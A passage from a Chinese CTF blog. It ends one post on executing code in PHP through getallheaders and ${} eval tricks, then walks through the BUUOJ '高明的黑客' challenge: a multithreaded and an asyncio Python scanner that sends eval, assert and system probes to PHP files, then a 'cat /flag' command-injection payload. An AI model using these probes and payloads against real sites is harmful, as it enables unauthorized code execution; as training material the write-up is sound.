Safari/537.36"</span><br><span class="line">  ["Accept"]=&gt;</span><br><span class="line">  string(118) "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"</span><br><span class="line">  ["Accept-Encoding"]=&gt;</span><br><span class="line">  string(13) "gzip, deflate"</span><br><span class="line">  ["Accept-Language"]=&gt;</span><br><span class="line">  string(14) "zh-CN,zh;q=0.9"</span><br><span class="line">  ["Connection"]=&gt;</span><br><span class="line">  string(5) "close"</span><br><span class="line">  ["Content-Length"]=&gt;</span><br><span class="line">  string(1) "2"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cmd: var_dump(implode(getallheaders()));//</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Wed, 31 Jul 2019 08:12:32 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.29 (Ubuntu)</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">Content-Length</span>: 346</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">string(331) "var_dump(implode(getallheaders()));//39.105.168.42:8001max-age=01Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3gzip, deflatezh-CN,zh;q=0.9close2"</span><br></pre></td></tr></table></figure>

<p>所以要把cmd写到第一行，后面cmd后面要加上//来注释掉后面所有的东西</p>
<p>相当于eval(“var_dump(implode(getallheaders()))”;)</p>
<p>然后命令$a=${eval(implode(getallheaders()))}    </p>
<h4 id><a href="#" class="headerlink" title="${}"></a>${}</h4><p>参考：<a href="https://www.php.net/manual/zh/language.variables.variable.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.variables.variable.php</a></p>
<p>有时候使用可变变量名是很方便的。就是说，一个变量的变量名可以动态的设置和使用。一个普通的变量通过声明来设置，例如：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> $a = <span class="string">'hello'</span>;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。在上面的例子中 <em>hello</em> 使用了两个美元符号（$）以后，就可以作为一个可变变量的变量了。例如：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> $$a = <span class="string">'world'</span>;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>这时，两个变量都被定义了：$a 的内容是“hello”并且 $hello 的内容是“world”。因此，以下语句：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"$a $&#123;$a&#125;"</span>;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>与以下语句输出完全相同的结果：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"$a $hello"</span>;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>它们都会输出：hello world。</p>
<p>所以${}里面的东西好像会当作PHP代码执行，</p>
<p><img src="/2019/07/31/Object/1564562302508.png" alt="1564562302508"></p>
<p>c并没有被赋值，然后${}里的内容确实被执行了。</p>
<p><img src="/2019/07/31/Object/1564562727517.png" alt="1564562727517"></p>
<p>但是这么测的时候，$c = eval(system(‘ls’));这条赋值语句，赋值的同时，命令也执行了。</p>
<p>但是针对这道题，去掉${}就解不出来了，可能是php版本还是什么的原因233333</p>
<p>（知道${}这玩意的作用就好了，溜了溜了~）</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/31/Object/" data-id="ck2g3l2en0003lgv3t5gbmeu6" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/note/">note</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-高明的黑客_easy_tornado" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/30/高明的黑客_easy_tornado/" class="article-date">
  <time datetime="2019-07-30T11:25:55.000Z" itemprop="datePublished">2019-07-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/30/高明的黑客_easy_tornado/">高明的黑客_easy_tornado</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="高明的黑客-easy-tornado"><a href="#高明的黑客-easy-tornado" class="headerlink" title="高明的黑客_easy_tornado"></a>高明的黑客_easy_tornado</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>别问Second去哪了，拿去完成第一天的任务了，我凑~</p>
<p>今天继续来到buuoj看题，先看看高明的黑客</p>
<h3 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h3><p>先下载源码，然后看看发现里面会有一堆垃圾代码，但是也存在$_GET, $_POST，只不过几乎都被“封印”了，所以（面向wp做题）就知道要写脚本，给get，post传参构造能制造回显的参数，然后看是否有回显，有回显则证明那个地方可以被利用。</p>
<p>赵师傅脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.thread <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">path = <span class="string">"/Users/jinzhao/PhpstormProjects/qwb/web2/"</span>  <span class="comment"># 文件夹目录</span></span><br><span class="line">files = os.listdir(path)  <span class="comment"># 得到文件夹下的所有文件名称</span></span><br><span class="line"></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span><span class="params">(file)</span>:</span></span><br><span class="line">    f = open(path + <span class="string">"/"</span> + file);  <span class="comment"># 打开文件</span></span><br><span class="line">    iter_f = iter(f);  <span class="comment"># 创建迭代器</span></span><br><span class="line">    str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> iter_f:  <span class="comment"># 遍历文件，一行行遍历，读取文本</span></span><br><span class="line">        str = str + line</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取一个页面内所有参数</span></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    params = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> str.find(<span class="string">"$_GET['"</span>, start) != <span class="number">-1</span>:</span><br><span class="line">        pos2 = str.find(<span class="string">"']"</span>, str.find(<span class="string">"$_GET['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = str[str.find(<span class="string">"$_GET['"</span>, start) + <span class="number">7</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        params[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(var)</span></span><br><span class="line"></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> str.find(<span class="string">"$_POST['"</span>, start) != <span class="number">-1</span>:</span><br><span class="line">        pos2 = str.find(<span class="string">"']"</span>, str.find(<span class="string">"$_POST['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = str[str.find(<span class="string">"$_POST['"</span>, start) + <span class="number">8</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        data[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(var)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># eval test</span></span><br><span class="line">    r = session.post(<span class="string">'http://localhost:11180/web2/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># assert test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> params:</span><br><span class="line">        params[i] = params[i][:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        data[i] = data[i][:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://localhost:11180/web2/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># system test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> params:</span><br><span class="line">        params[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        data[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://localhost:11180/web2/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print("====================")</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files:  <span class="comment"># 遍历文件夹</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(file):  <span class="comment"># 判断是否是文件夹，不是文件夹才打开</span></span><br><span class="line">        <span class="comment"># read_file(file)</span></span><br><span class="line"></span><br><span class="line">        pool.submit(read_file, file)</span><br></pre></td></tr></table></figure>

<p>运行结果如下：<img src="/2019/07/30/%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2_easy_tornado/1564375540326.png" alt="1564375540326"></p>
<p>然后去到这个文件，</p>
<p><img src="/2019/07/30/%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2_easy_tornado/1564375712837.png" alt="1564375712837"></p>
<p>找到利用点在这里，</p>
<p>所以构造payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web15.buuoj.cn<span class="regexp">/xk0SzyKwfzw.php?Efa5BVG=cat%20/</span>flag</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/30/%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2_easy_tornado/1564375802994.png" alt="1564375802994"></p>
<h4 id="learning"><a href="#learning" class="headerlink" title="learning"></a>learning</h4><p>这里用的是赵师傅的脚本，感觉自己写脚本能力太差了，所以今天就是自己写一份脚本，然后觉得赵师傅这里的脚本还可以再完善一下，可以直接拿flag的那种。</p>
<p>一下是构造脚本的，心路历程</p>
<p>首先，嫖一手赵师傅的文件名读取</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">path = <span class="string">"D:/phpstudy/PHPTutorial/WWW/src/"</span>  <span class="comment"># 文件夹目录</span></span><br><span class="line">files = os.listdir(path)  <span class="comment"># 得到文件夹下的所有文件名称</span></span><br></pre></td></tr></table></figure>

<p>然后套路：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>main()函数呢</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        readfile(file)</span><br></pre></td></tr></table></figure>

<p>接下来是最重要的函数readfile了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readfile</span><span class="params">(file)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(path+<span class="string">'/'</span>+file,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = str(f.read())					//读取一个文件内容赋值给content</span><br></pre></td></tr></table></figure>

<p>然后嫖赵师傅的获取get和post形参的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">	start = <span class="number">0</span></span><br><span class="line">    params = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> str.find(<span class="string">"$_GET['"</span>, start) != <span class="number">-1</span>:		//找到$_GET[<span class="string">'，返回$的位置</span></span><br><span class="line"><span class="string">        pos2 = str.find("'</span>]<span class="string">", str.find("</span>$_GET[<span class="string">'", start) + 1)   //从找到$后的位置开始找'</span>]，返回<span class="string">'的位置</span></span><br><span class="line"><span class="string">        var = str[str.find("$_GET['</span><span class="string">", start) + 7: pos2]		//根据返回的两个位置，切片，得到形参	</span></span><br><span class="line"><span class="string">        start = pos2 + 1	//开始找下一个$_GET['</span></span><br><span class="line"><span class="string">        params[var] = 'echo("</span>glzjin<span class="string">");'			//给所有形参赋值，比如，XXX = echo("</span>glzjin<span class="string">");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        # print(var)</span></span><br><span class="line"><span class="string">#post同理</span></span><br><span class="line"><span class="string">    start = 0</span></span><br><span class="line"><span class="string">    data = &#123;&#125;</span></span><br><span class="line"><span class="string">    while str.find("</span>$_POST[<span class="string">'", start) != -1:</span></span><br><span class="line"><span class="string">        pos2 = str.find("'</span>]<span class="string">", str.find("</span>$_POST[<span class="string">'", start) + 1)</span></span><br><span class="line"><span class="string">        var = str[str.find("$_POST['</span><span class="string">", start) + 8: pos2]</span></span><br><span class="line"><span class="string">        start = pos2 + 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        data[var] = 'echo("</span>glzjin<span class="string">");'</span></span><br></pre></td></tr></table></figure>

<p>然后是测试文件中发现的三种可利用函数，eval，assert，system</p>
<p>（先引入request模块）</p>
<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="title">session</span> = requests.<span class="type">Session</span>()</span><br></pre></td></tr></table></figure>

<p>eval：</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = session.<span class="built_in">post</span>(<span class="string">'http://127.0.0.1/src/'</span> + <span class="built_in">file</span>, data=data, <span class="built_in">params</span>=<span class="built_in">params</span>)	<span class="comment">	//构成eval(echo("glzjin");)</span></span><br><span class="line">    <span class="keyword">if</span> r.<span class="keyword">text</span>.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        print(<span class="built_in">file</span> + <span class="string">" found!"</span>)</span><br></pre></td></tr></table></figure>

<p>了解一下requests这个模块，这里的 session.post里头，data应该是post请求的内容，而params应该是get请求的内容</p>
<p>assert:</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">params</span>:</span><br><span class="line">      <span class="built_in">params</span>[i] = <span class="built_in">params</span>[i][:<span class="number">-1</span>]		<span class="comment">	//去掉分号</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">      data[i] = data[i][:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">  r = session.<span class="built_in">post</span>(<span class="string">'http://127.0.0.1/src/'</span> + <span class="built_in">file</span>, data=data, <span class="built_in">params</span>=<span class="built_in">params</span>)	<span class="comment">	//构成asser(echo("glzjin"))</span></span><br><span class="line">  <span class="keyword">if</span> r.<span class="keyword">text</span>.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">      print(<span class="built_in">file</span> + <span class="string">" found!"</span>)</span><br></pre></td></tr></table></figure>

<p>system:</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">params</span>:</span><br><span class="line">	<span class="built_in">params</span>[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    data[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">r = session.<span class="built_in">post</span>(<span class="string">'http://127.0.0.1/src/'</span> + <span class="built_in">file</span>, data=data, <span class="built_in">params</span>=<span class="built_in">params</span>)	<span class="comment">	//构成system(echo glzjin)</span></span><br><span class="line"><span class="keyword">if</span> r.<span class="keyword">text</span>.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">    print(<span class="built_in">file</span> + <span class="string">" found!"</span>)</span><br></pre></td></tr></table></figure>

<p>三种语法对应三种函数的测试</p>
<p>差不多就这样，去测试一下用时，先看赵师傅的多线程用时（没错，对脚本的改进就是这个用时问题）</p>
<p>（嘶~        一开脚本，cpu就100%，）</p>
<p><img src="/2019/07/30/%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2_easy_tornado/1564380595459.png" alt="1564380595459"></p>
<p><img src="/2019/07/30/%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2_easy_tornado/1564380610278.png" alt="1564380610278"></p>
<p><img src="/2019/07/30/%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2_easy_tornado/1564382532801.png" alt="1564382532801"></p>
<p>一共用时679秒，十一分钟多（发现其实三种函数都能引起回显）</p>
<p>然后我们试试我们那个没用多线程的（找点什么事打发时间嘞，，，）</p>
<p>去做了一组四分钟的tabata，然后发现任务管理器里，虽然cup占用率是100，但一次只发现一个windows command processing，而赵师傅的多线程一次是七八个，难道这个脚本要跑一个多小时？</p>
<p>那趁着这个机会，先看看赵师傅的多线程，然后去学学协程</p>
<p>先列出赵师傅脚本中属于多线程的代码</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> concurrent.futures.thread <span class="keyword">import</span> ThreadPoolExecutor		<span class="comment">//线程池</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line">mutex.acquire()</span><br><span class="line">mutex.release()</span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">50</span>)		<span class="comment">//设置线程的最大数</span></span><br><span class="line">pool.submit(read_file, <span class="keyword">file</span>)</span><br></pre></td></tr></table></figure>

<ol>
<li><p><code>ThreadPoolExecutor</code>构造实例的时候，传入<code>max_workers</code>参数来设置线程池中最多能同时运行的线程数目。</p>
</li>
<li><p>使用<code>submit</code>函数来提交线程需要执行的任务（函数名和参数）到线程池中，并返回该任务的句柄（类似于文件、画图），注意<code>submit()</code>不是阻塞的，而是立即返回。</p>
</li>
</ol>
<p>​    链接：<a href="https://www.jianshu.com/p/b9b3d66aa0be" target="_blank" rel="noopener">https://www.jianshu.com/p/b9b3d66aa0be</a></p>
<p>然后里面有个锁的概念</p>
<p>当多线程中需要“独占资源”的时候，要使用锁来控制，防止多个线程同时占用资源而出现其他异常。使用锁的时候就调用acquire()方法，以此告诉其他线程，我正在占用该资源，你们要等会；待使用资源后需要释放资源的时候就调用release()方法，告诉其他线程，我已经完成使用该资源了，其他人可以过来使用了。</p>
<p>但我觉得，因为一个线程是在使用某个资源前加的锁，其他线程怎么知道你给谁加了锁，所以是不是，一加锁，其他线程就停了呢？待验证。</p>
<p>这里，我自己的脚本大概要听一下了，一共3002个文件，跑一个文件用时1s，大概真的要50分钟到一个小时了，那我们来试试协程</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line">import asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">path = <span class="string">"D:/phpstudy/PHPTutorial/WWW/src/"</span>  </span><br><span class="line">files = os.listdir(path)  </span><br><span class="line"><span class="meta">#print(len(files))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">async def read_file(file):</span><br><span class="line">    f = open(path + <span class="string">"/"</span> + file);  </span><br><span class="line">    iter_f = iter(f);  </span><br><span class="line">    <span class="built_in">str</span> = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="built_in">in</span> iter_f:  </span><br><span class="line">        <span class="built_in">str</span> = <span class="built_in">str</span> + line</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    <span class="built_in">params</span> = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"$_GET['"</span>, start) != -<span class="number">1</span>:</span><br><span class="line">        pos2 = <span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"']"</span>, <span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"$_GET['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = <span class="built_in">str</span>[<span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"$_GET['"</span>, start) + <span class="number">7</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">params</span>[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="meta"># print(var)</span></span><br><span class="line"></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"$_POST['"</span>, start) != -<span class="number">1</span>:</span><br><span class="line">        pos2 = <span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"']"</span>, <span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"$_POST['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = <span class="built_in">str</span>[<span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"$_POST['"</span>, start) + <span class="number">8</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        data[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="meta"># print(var)</span></span><br><span class="line"></span><br><span class="line">    <span class="meta"># eval test</span></span><br><span class="line">    r = session.post(<span class="string">'http://127.0.0.1/src/'</span> + file, data=data, <span class="built_in">params</span>=<span class="built_in">params</span>)</span><br><span class="line">    <span class="keyword">if</span> r.<span 